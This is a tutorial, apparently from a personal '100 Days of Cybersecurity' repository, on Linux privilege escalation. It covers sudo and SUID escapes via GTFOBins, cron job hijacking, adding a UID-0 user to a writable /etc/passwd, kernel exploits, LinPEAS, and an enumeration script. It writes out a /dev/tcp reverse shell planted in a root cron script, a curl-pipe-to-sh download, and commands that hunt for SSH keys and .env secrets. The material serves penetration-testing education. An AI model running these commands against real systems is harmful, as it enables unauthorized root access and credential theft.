# Day 035 - Privilege Escalation: Linux (GTFOBins & SUID)

> **Challenge:** 100 Days of Cybersecurity | **Phase:** Offensive Security | **Difficulty:** Intermediate

---

## 🧠 The Concept

You have a shell. But you're `www-data` or a low-privilege user.

The real target is root.

Privilege escalation is the process of moving from limited access to full system control. It's one of the most important skills in offensive security - and one of the most consistently found issues in real penetration tests.

Today: the most common Linux privesc paths, the tools to find them, and the techniques to exploit them.

---

## 🗺️ Privesc Methodology

```
1. Enumerate everything
2. Identify misconfigurations
3. Find the path to root
4. Exploit it
5. Document it
```

Never skip step 1. Most people jump to exploitation before fully understanding the environment. The easiest path is almost always found during enumeration.

---

## 🔍 Manual Enumeration Checklist

```bash
# ── Who am I? ─────────────────────────────
whoami && id
sudo -l                    # what can I run as sudo?
cat /etc/passwd            # all users
cat /etc/group             # all groups
groups                     # my groups

# ── System info ───────────────────────────
uname -a                   # kernel version → search for kernel exploits
cat /etc/os-release        # OS version
cat /proc/version

# ── Interesting files ─────────────────────
find / -name "*.conf" -readable 2>/dev/null | head -20
find / -name "id_rsa" 2>/dev/null      # SSH private keys
find / -name ".env" 2>/dev/null        # environment files with secrets
find / -name "*.bak" 2>/dev/null       # backup files
cat ~/.bash_history                    # command history
cat ~/.ssh/id_rsa 2>/dev/null          # SSH key

# ── Writable files ────────────────────────
find / -writable -type f 2>/dev/null | grep -v proc | grep -v sys
find /etc -writable 2>/dev/null        # writable /etc files = serious

# ── Scheduled tasks ───────────────────────
cat /etc/crontab
ls -la /etc/cron.*
crontab -l
cat /var/spool/cron/crontabs/* 2>/dev/null

# ── Network ───────────────────────────────
ss -tuln                   # listening services
ip route                   # network routes - other subnets?
cat /etc/hosts             # internal hostnames
```

---

## 🎯 Path 1 - Sudo Misconfigurations

`sudo -l` shows what you can run as root. This is the first thing to check.

```bash
sudo -l
# (root) NOPASSWD: /usr/bin/find
# (root) NOPASSWD: /bin/vim
# (root) NOPASSWD: /usr/bin/python3
```

If any binary is in `sudo -l` - check GTFOBins for the escalation method.

**Common sudo escalations:**

```bash
# vim → root shell
sudo vim -c ':!/bin/bash'

# find → execute commands as root
sudo find / -exec /bin/bash \;
sudo find /etc/passwd -exec bash -ip \;

# python → root shell
sudo python3 -c 'import os; os.system("/bin/bash")'

# less → shell escape
sudo less /etc/passwd
# Inside less: !bash

# awk
sudo awk 'BEGIN {system("/bin/bash")}'

# nmap (older versions)
sudo nmap --interactive
# nmap> !bash

# tar → command execution via checkpoint
sudo tar cf /dev/null /dev/null --checkpoint=1 \
  --checkpoint-action=exec=/bin/bash
```

---

## 🏷️ Path 2 - SUID Binaries

SUID (Set User ID) binaries run as their owner regardless of who executes them.

If a SUID binary is owned by root - it runs as root.

```bash
# Find all SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Common legitimate SUID binaries (usually safe):
# /usr/bin/passwd, /usr/bin/sudo, /usr/bin/su, /bin/ping

# Suspicious SUID binaries - check GTFOBins:
# /usr/bin/vim, /usr/bin/find, /usr/bin/python3, /bin/bash,
# /usr/bin/nmap, /usr/bin/less, /usr/bin/more, /usr/bin/awk
```

**Exploiting SUID find:**
```bash
# If find has SUID bit:
/usr/bin/find / -exec whoami \;
# Returns: root

/usr/bin/find / -exec /bin/bash -p \;
# -p = privileged mode, preserves effective UID
# Spawns root bash
```

**Exploiting SUID bash:**
```bash
# If /bin/bash has SUID (misconfiguration):
/bin/bash -p
# bash-5.0# whoami
# root
```

---

## 📅 Path 3 - Cron Job Exploitation

Cron jobs run on schedule - often as root.

If you can modify a script that root's cron executes - you execute code as root.

```bash
# Check crontab
cat /etc/crontab

# Example vulnerable entry:
# * * * * * root /opt/backup.sh

# Check if backup.sh is writable
ls -la /opt/backup.sh
# -rwxrwxrwx root root /opt/backup.sh  ← world writable!

# Overwrite with reverse shell
echo 'bash -i >& /dev/tcp/192.168.56.1/4444 0>&1' > /opt/backup.sh

# Wait for cron to execute → root shell lands on your listener
nc -lvnp 4444
```

**Writable directory in cron path:**
```bash
# If cron runs: cleanup (no full path)
# And /usr/local/bin is in PATH and writable:
echo '#!/bin/bash\nbash -i >& /dev/tcp/192.168.56.1/4444 0>&1' > /usr/local/bin/cleanup
chmod +x /usr/local/bin/cleanup
# Cron runs your version instead
```

---

## 🔑 Path 4 - Writable /etc/passwd

`/etc/passwd` stores user accounts. If writable - add your own root user.

```bash
# Check if writable (unusual but happens)
ls -la /etc/passwd
# -rw-rw-rw- root root /etc/passwd ← writable by all

# Generate password hash
openssl passwd -1 -salt xyz hacked
# $1$xyz$...hash...

# Append root-level user
echo 'hacker:$1$xyz$HASH:0:0:root:/root:/bin/bash' >> /etc/passwd

# Switch to new user
su hacker
# Password: hacked
whoami
# root
```

---

## 🛠️ Path 5 - Kernel Exploits

The nuclear option - exploit a vulnerability in the kernel itself.

```bash
# Get kernel version
uname -a
# Linux victim 4.4.0-21-generic #37-Ubuntu SMP Mon Apr 18 18:34:49 UTC 2016

# Search for exploits
searchsploit linux kernel 4.4.0
searchsploit ubuntu 16.04 privilege escalation

# Famous kernel exploits:
# DirtyCow (CVE-2016-5195) → affects Linux kernel < 4.8.3
# Dirty Pipe (CVE-2022-0847) → affects Linux kernel 5.8 - 5.16.11
```

---

## 🤖 Automated Enumeration - LinPEAS

LinPEAS automates all of the above and more.

```bash
# Download and run on target
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Or transfer from Kali
scp linpeas.sh user@target:/tmp/
chmod +x /tmp/linpeas.sh
/tmp/linpeas.sh

# Save output for review
/tmp/linpeas.sh | tee /tmp/linpeas_output.txt
```

LinPEAS highlights findings by colour:
- 🔴 Red/Yellow = highly likely privesc vector
- 🟡 Yellow = worth investigating
- 🔵 Blue = informational

---

## 💻 The Code - PrivEsc Check Script

```bash
#!/bin/bash
# Day 035 - Linux Privilege Escalation Checker
# 100 Days of Cybersecurity by Sudeep Ravichandran
#
# Quick manual privesc enumeration script.
# Run after getting a low-privilege shell.
#
# Usage: bash privesc_check.sh

echo "==========================================="
echo " Linux PrivEsc Checker - Day 035"
echo " 100 Days of Cybersecurity"
echo "==========================================="
echo ""

# ── Basic context ──────────────────────────────
echo "[ USER CONTEXT ]"
echo "  User   : $(whoami)"
echo "  ID     : $(id)"
echo "  Home   : $HOME"
echo ""

# ── Sudo privileges ────────────────────────────
echo "[ SUDO PRIVILEGES ]"
sudo -l 2>/dev/null | grep -v "^$" | grep -v "Matching" \
  | awk '{print "  "$0}'
echo ""

# ── SUID binaries ──────────────────────────────
echo "[ SUID BINARIES - check GTFOBins for each ]"
find / -perm -4000 -type f 2>/dev/null \
  | while read f; do
      owner=$(stat -c "%U" "$f" 2>/dev/null)
      echo "  [owner:$owner] $f"
    done
echo ""

# ── Writable /etc files ────────────────────────
echo "[ WRITABLE /etc FILES (high risk) ]"
find /etc -writable -type f 2>/dev/null \
  | awk '{print "  ⚠  "$0}'
echo ""

# ── Crontab ────────────────────────────────────
echo "[ CRON JOBS ]"
cat /etc/crontab 2>/dev/null | grep -v "^#" | grep -v "^$" \
  | awk '{print "  "$0}'
ls /etc/cron.d/ 2>/dev/null | awk '{print "  /etc/cron.d/"$0}'
echo ""

# ── Interesting files ──────────────────────────
echo "[ INTERESTING FILES ]"
for f in ~/.bash_history ~/.ssh/id_rsa /root/.bash_history; do
  [ -r "$f" ] && echo "  ✓ Readable: $f"
done
find / -name "*.bak" -readable 2>/dev/null | head -5 \
  | awk '{print "  .bak: "$0}'
find / -name ".env" -readable 2>/dev/null | head -5 \
  | awk '{print "  .env: "$0}'
echo ""

# ── Kernel version ─────────────────────────────
echo "[ KERNEL VERSION - check for exploits ]"
echo "  $(uname -a)"
echo "  → searchsploit linux kernel $(uname -r | cut -d- -f1)"
echo ""

# ── Network ────────────────────────────────────
echo "[ INTERNAL NETWORK ]"
ip a 2>/dev/null | grep "inet " | awk '{print "  "$0}'
cat /etc/hosts | grep -v "^#" | grep -v "^$" \
  | awk '{print "  "$0}'
echo ""

echo "==========================================="
echo " Done. Check GTFOBins: https://gtfobins.github.io"
echo "==========================================="
```

**To run:**
```bash
chmod +x privesc_check.sh
bash privesc_check.sh
```

---

## 🔑 Key Takeaways

- `sudo -l` is always the first check - any allowed binary can escalate privileges
- GTFOBins documents escalation paths for hundreds of binaries
- SUID binaries running as root are a common privesc path in CTFs and real environments
- Cron jobs running scripts you can modify = code execution as root
- LinPEAS automates enumeration - use it on every machine
- Kernel exploits are the last resort - noisy and can crash the system

---

## 📚 Resources
- [GTFOBins](https://gtfobins.github.io/) - the privesc bible
- [LinPEAS](https://github.com/carlospolop/PEASS-ng) - automated enumeration
- [TryHackMe - Linux PrivEsc Room (free)](https://tryhackme.com/room/linprivesc)

---

## [⬅️ Day 034](../day034/) | [➡️ Day 036](../day036/)

*Part of my [100 Days of Cybersecurity](../README.md) challenge.*